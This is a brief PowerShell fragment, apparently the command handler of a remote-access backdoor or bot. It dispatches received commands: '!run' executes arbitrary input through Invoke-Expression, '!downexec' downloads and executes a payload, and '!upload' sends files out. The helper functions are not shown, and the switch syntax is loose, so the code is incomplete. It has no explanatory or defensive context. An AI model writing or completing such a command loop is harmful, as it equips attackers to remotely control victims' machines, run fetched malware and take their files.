switch ($inputCommand) {
 !run { Invoke-Expression $inputCommand }
 !downexec { DownloadAndExecute }
 !upload { UploadFile }
}
